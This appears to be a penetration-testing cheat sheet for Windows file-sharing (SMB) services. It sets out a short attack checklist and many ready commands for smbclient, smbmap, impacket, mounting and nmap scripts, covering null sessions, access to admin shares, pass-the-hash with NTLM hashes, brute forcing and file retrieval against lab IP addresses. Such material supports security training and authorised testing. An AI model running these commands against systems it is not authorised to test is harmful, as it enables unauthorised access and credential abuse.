# SMB (Server Message Block): Port Number -- 139,445
SMB SMB (Server Message Block) is one of the most important port and this protocol is designed to share files. In SMB, authentication is required to access resources or files. Basically SMB runs on default port number 139 or 445. Strong password should be used by the admin on their important resources so that it cannot be easily guessable. 
SMB has been used primarily to connect Windows computers, although most other systems -- such as Linux and macOS -- also include client components for connecting to SMB resources.
### SMB Versions
```
    CIFS: The old version of SMB, which was included in Microsoft Windows NT 4.0 in 1996.
    SMB 1.0 / SMB1: The version used in Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2.
    SMB 2.0 / SMB2: This version used in Windows Vista and Windows Server 2008.
    SMB 2.1 / SMB2.1: This version used in Windows 7 and Windows Server 2008 R2.
    SMB 3.0 / SMB3: This version used in Windows 8 and Windows Server 2012.
    SMB 3.02 / SMB3: This version used in Windows 8.1 and Windows Server 2012 R2.
    SMB 3.1: This version used in Windows Server 2016 and Windows 10.
```
#### Step to follow in this attack

```
1.Find the null session

2.if null session is not there than find the user

3.User id password 

4.Always focous on the extenction on the file

5.Try the wordpress user_name password for FTP SMB   

6. Use hash password to login with smb
```

## SMB CLIENT TOOLS:

#### SMBCLIETN
```
# smbclient -L //192.168.1.41		- Null session

# smbclient -L //192.168.1.41/data -U

	smb:\>?

	smb:\> cd /tmp/

	smb:\> get phpinfo.php

	smb:\> mget *.exe

	smb:\> cd dir1

	smb:\dir1\> pwd 

	smb:\dir1\> put phpinfo.php 

	smb:\dir1\> mput *.exe

	smb:\dir1\> mkdir a


# smbclient -L //192.168.1.41/ADMIN$ -U "administrator"

# smbclient -L //192.168.1.41/E$ -U "administrator"

# smbclient -U 'administrator%password' \\\\192.168.1.41\\C$ 

# smbclient -U 'administrator%password' //192.168.1.41/C$

# smbclient //192.168.1.41/C$ -U administrator --pw-nt-hash 8846F7EAEE8FB117AD06BDD830B7586C    	    - pass the hash

# smbclient -U 'administrator%password' //192.168.1.41/C$ --option='client min protocol=NT1'	   - Use when we get protocol error

```
#### SMBMAP

```
# smbmap -H 192.168.1.140

# smbmap -H 192.168.1.140 -u administrator -p 123

# smbmap -H 192.168.1.140 -u DoesNotExist						- User is not exist

# smbmap -H 192.168.1.140 -u administrator -p 123 -R					- Recurssive directory search

# smbmap --help

# smbmap -H 192.168.1.140 -u administrator -p 123 -R data				- Recurssive directory search

# smbmap -H 192.168.1.140 -L

# smbmap -H 192.168.1.140 -u administrator -p 123 -s data				- share 

# smbmap -H 192.168.1.140 -u administrator -p 123 -P 445				- Define Port

# smbmap -H 192.168.1.140 -u administrator -p 'LM_hash:NTLM_hash'

> LM_hash	- aad3b435b51404eeaad3b435b51404ee (Empty value)

# smbmap -H 192.168.1.140 -u administrator -p 'aad3b435b51404eeaad3b435b51404ee:8846F7EAEE8FB117AD06BDD830B7586C'
```
#### impacket-smbclient
```
# impacket-smbclient --help

# impacket-smbclient domain_name/user_name:password@IP$

# impacket-smbclient google.com/administrator:123@192.168.1.140

 	> ?

 	> share

 	> use data(share_folder_name)
```

#### SMBTAR
```
# smbtar --help

# smbtar -s IP$ -x folder_name -t tar_file -u user_name -p password -v 

# smbtar -s 192.168.1.140 -x data -t data.tar -u administrator -p 123 -v
```

#### SMBGET
```
# smbget smb://IP$/folder_name/file_name

# smbget smb://192.168.129.237/data/php-my-admin.zip

# smbget --help

# smbget -U administrator smb://192.168.129.327/data/php-my-admin.zip

# smbget -U administrator smb://192.168.129.327/data/php-my-admin.zip -o /tmp/php-my-admin.zip
```
#### smb mount

```
# smbmount:

# cd /mnt/						- Check mount folder

# mount -t cifs //IP$/folder_name /mnt/mount_location

# mount -t cifs //192.168.1.140 /mnt/d1

# mount -t cifs //192.168.1.140/data -o user=administrator,password=123 /mnt/d1

# cd /mnt/d1

# mount -t cifs //192.168.1.140/data /mnt/d1 -nolock				- When version Problem

# mount -t cifs //192.168.1.140/data /mnt/d1 -nolock --rw			- Mount with read and write permission
```
#### Pass the HASH

```
# smbmap -H 192.168.1.140 -u administrator -p 'LM_hash:NTLM_hash'

# LM_hash	- aad3b435b51404eeaad3b435b51404ee (Empty value)

# smbmap -H 192.168.1.140 -u administrator -p 'aad3b435b51404eeaad3b435b51404ee:8846F7EAEE8FB117AD06BDD830B7586C'

# smbclient //IP$/FOLDER_NAME -U user_name --pw-nt-hash NTLM_HASH

# smbclient //192.168.1.41/C$ -U administrator --pw-nt-hash 8846F7EAEE8FB117AD06BDD830B7586C


```
### Enumeration Tools:
SMB enumeration provide important information about our target.
#### Nmap
```
# ls /usr/share/nmap/scripts/ | grep smb
		smb2-capabilities.nse
		smb2-security-mode.nse
		smb2-time.nse
		smb2-vuln-uptime.nse
		smb-brute.nse
		smb-double-pulsar-backdoor.nse
		smb-enum-domains.nse
		smb-enum-groups.nse
		smb-enum-processes.nse
		smb-enum-services.nse
		smb-enum-sessions.nse
		smb-enum-shares.nse
		smb-enum-users.nse
		smb-flood.nse
		smb-ls.nse
		smb-mbenum.nse
		smb-os-discovery.nse
		smb-print-text.nse
		smb-protocols.nse
		smb-psexec.nse
		smb-security-mode.nse
		smb-server-stats.nse
		smb-system-info.nse
		smb-vuln-conficker.nse
		smb-vuln-cve2009-3103.nse
		smb-vuln-cve-2017-7494.nse
		smb-vuln-ms06-025.nse
		smb-vuln-ms07-029.nse
		smb-vuln-ms08-067.nse
		smb-vuln-ms10-054.nse
		smb-vuln-ms10-061.nse
		smb-vuln-ms17-010.nse
		smb-vuln-regsvc-dos.nse
		
nmap -v -sV -sT --script=smb-os-discovery.nse -p 445,139 192.168.129.237

nmap -v -sV -sT --script=smb-system-info.nse -p 445,139 192.168.129.237

nmap -v -sV -sT --script=smb-enum-shares.nse -p 445,139 192.168.129.237

nmap -v -sV -sT --script=smb-enum-users.nse -p 445,139 192.168.129.237

nmap -v -sV -sT --script=smb-enum-domains.nse -p 445,139 192.168.129.237

nmap -v -sV -sT --script=smb-enum-groups.nse  -p 445,139 192.168.129.237

nmap -v -sV -sT --script=smb-enum-processes.nse  -p 445,139 192.168.129.237

nmap -v -sV -sT --script=smb-enum-services.nse  -p 445,139 192.168.129.237

nmap -v -sV -sT --script=smb-brute.nse  -p 445,139 192.168.129.237

nmap -v -sV -sT --script=smb-ls --script-args 'share=c$,path=\data' -p 445,139 192.168.129.237

```
#### Command to find open SMB shares through nmap
```
 nmap -v --script smb-enum-shares --script-args smbuser=admin,smbpass=admin -p445 192.168.1.0/24
```
### Hostname
 Tools to enumerate hostname
 
```
   # nmblookup -A ip
   # nbtstat -A ip
   # nbtscan ip
